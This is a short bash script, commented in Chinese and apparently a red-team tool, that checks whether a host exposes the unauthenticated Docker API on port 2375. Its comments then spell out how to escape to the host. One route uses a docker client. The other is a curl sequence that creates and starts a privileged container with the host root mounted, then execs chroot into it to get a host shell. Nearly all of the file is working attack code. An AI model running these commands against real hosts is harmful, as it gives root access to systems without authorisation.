#!/usr/bin/env bash
HOST="${1:?usage: bash docker.sh HOST [PORT]}"
PORT="${2:-2375}"
B="http://$HOST:$PORT"
echo '--- 判定'
curl -sS -m 8 "$B/version" | head -c 200; echo
curl -sS -m 8 "$B/containers/json" | head -c 200; echo
echo '--- 逃逸（创建挂载宿主根的特权容器）'
# 有 docker 客户端时最省事：
#   docker -H tcp://$HOST:$PORT run -it -v /:/host alpine chroot /host sh
# 只有 curl 时：
#   curl -sS -X POST "$B/containers/create?name=rtprobe" -H 'Content-Type: application/json' \
#     -d '{"Image":"alpine","Cmd":["sh","-c","sleep 600"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
#   curl -sS -X POST "$B/containers/rtprobe/start"
#   curl -sS -X POST "$B/containers/rtprobe/exec" -H 'Content-Type: application/json' \
#     -d '{"Cmd":["chroot","/host","sh","-c","id"]}'
# 用完清理：curl -sS -X POST "$B/containers/rtprobe/kill" ; curl -sS -X DELETE "$B/containers/rtprobe"
